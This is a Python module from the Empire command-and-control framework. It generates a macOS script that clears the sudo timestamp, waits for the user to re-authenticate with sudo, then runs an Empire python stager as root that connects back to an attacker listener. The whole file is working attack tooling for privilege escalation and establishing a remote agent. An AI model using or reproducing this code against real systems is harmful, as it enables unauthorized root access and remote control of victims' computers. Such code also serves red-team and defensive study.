from typing import Dict

from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # extract all of our options
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        safe_checks = params["SafeChecks"]

        # generate the launcher code
        launcher = main_menu.stagers.generate_launcher(
            listener_name,
            language="python",
            userAgent=user_agent,
            safeChecks=safe_checks,
        )

        if launcher == "":
            return handle_error_message("[!] Error in launcher command generation.")
        else:
            launcher = launcher.replace("'", "\\'")
            launcher = launcher.replace("echo", "")
            parts = launcher.split("|")
            launcher = "sudo python -c %s" % (parts[0])
            script = """
import os
import time
import subprocess
sudoDir = "/var/db/sudo"
subprocess.call(['sudo -K'], shell=True)
oldTime = time.ctime(os.path.getmtime(sudoDir))
exitLoop=False
while exitLoop is False:
    newTime = time.ctime(os.path.getmtime(sudoDir))
    if oldTime != newTime:
        try:
            subprocess.call(['%s'], shell=True)
            exitLoop = True
        except:
            pass
            """ % (
                launcher
            )

            return script
